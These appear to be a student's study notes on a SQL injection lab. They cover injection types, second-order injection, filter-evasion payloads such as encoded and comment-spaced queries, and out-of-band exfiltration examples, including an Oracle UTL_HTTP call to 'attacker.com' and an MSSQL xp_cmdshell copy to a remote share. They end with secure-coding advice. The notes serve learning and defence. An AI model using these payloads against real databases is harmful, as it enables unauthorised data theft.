# Advanced SQL Injection

---

## TASK 1: Intro

Use `nmap` to see open ports, running services, target OS, etc.

```bash
nmap -A -T4 -p 3306,3389,445,139,135 10.82.144.150
```

Example output:

```
PORT     STATE    SERVICE       VERSION
135/tcp  open     msrpc
139/tcp  open     netbios-ssn
445/tcp  open     microsoft-ds
3306/tcp open     mysql
3389/tcp open     ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=SQLi
| Not valid before: 2024-05-23T04:08:44
|_Not valid after:  2024-11-22T04:08:44
```

---

## TASK 2: Quick Recap

### In-band SQL Injection

- **Error-Based SQL Injection**: Exploits error messages to gather database information.
- **Union-Based SQL Injection**: Uses the UNION operator to retrieve data from other tables.

### Inferential (Blind) SQL Injection

- **Boolean-Based Blind SQL Injection**: Infers true/false conditions by analyzing application responses.
- **Time-Based Blind SQL Injection**: Measures response delays to infer true/false conditions.

### Out-of-band SQL Injection

Used when the same channel cannot be used for attack and data retrieval. Relies on the database server making external requests (e.g., HTTP or DNS) to send results to the attacker.

---

## TASK 3: Second-Order SQL Injection

Second-order SQL injection exploits stored user input that is later used in SQL queries. The attack triggers when the saved data is retrieved and processed, making it harder to detect during initial input validation.

Example:

```sql
UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '123123';
```

If the attacker uses the `ssn` value:

```sql
12345'; UPDATE books SET book_name = 'Hacked'; --
```

The code will execute the following statement:

```sql
UPDATE books SET book_name = 'Testing', author = 'Hacker' WHERE ssn = '12345';
UPDATE books SET book_name = 'hacked'; --
```

---

## TASK 4: Filter Evasion Techniques

Advanced SQL injection attacks require bypassing filters to exploit vulnerabilities. Techniques include:

### Character Encoding

- **URL Encoding**: Converts characters to `%` followed by their ASCII hex value.
- **Hexadecimal Encoding**: Represents strings as hex values.
- **Unicode Encoding**: Uses Unicode escape sequences.

Example:

```url
http://10.80.140.92/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20OR%201=1
```

### No-Quote SQL Injection

- **Using Numerical Values**: Example: `OR 1=1`.
- **Using SQL Comments**: Example: `admin'--`.
- **Using CONCAT() Function**: Example: `CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)`.

### No Spaces Allowed

- **Comments to Replace Spaces**: Example: `SELECT/**/*FROM/**/users/**/WHERE/**/name/**/='admin'`.
- **Tab or Newline Characters**: Example: `SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'`.

---

## TASK 5: Out-of-band SQL Injection

Out-of-band (OOB) SQL injection exploits separate channels, like HTTP, DNS, or SMB, for sending payloads and receiving responses. It bypasses direct methods, minimizes detection risks, and circumvents firewalls or IDS.

### Techniques in Different Databases

#### MySQL and MariaDB

```sql
SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';
```

#### Microsoft SQL Server (MSSQL)

```sql
EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';
```

#### Oracle

```sql
DECLARE
    req UTL_HTTP.REQ;
    resp UTL_HTTP.RESP;
BEGIN
    req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
    UTL_HTTP.GET_RESPONSE(req);
END;
```

---

## TASK 9: Best Practices

### Secure Coders

- **Parameterised Queries**: Use parameterised queries to separate SQL structure from data, preventing injection.
- **Input Validation**: Validate and sanitise inputs to ensure they meet expected formats.
- **Least Privilege**: Grant minimal database permissions to application accounts.
- **Stored Procedures**: Use stored procedures to encapsulate and validate SQL logic.
- **Security Audits**: Perform regular audits and code reviews.

### Pentesters

- **Exploiting Database-Specific Features**: Understand the specifics of the target DBMS.
- **Leveraging Error Messages**: Exploit verbose error messages to gain insights into the database schema.
- **Bypassing WAF and Filters**: Test various obfuscation techniques to bypass Web Application Firewalls (WAF).
- **Database Fingerprinting**: Determine the type and version of the database to tailor the attack.
- **Pivoting with SQL Injection**: Use SQL injection to pivot and exploit other parts of the network.

---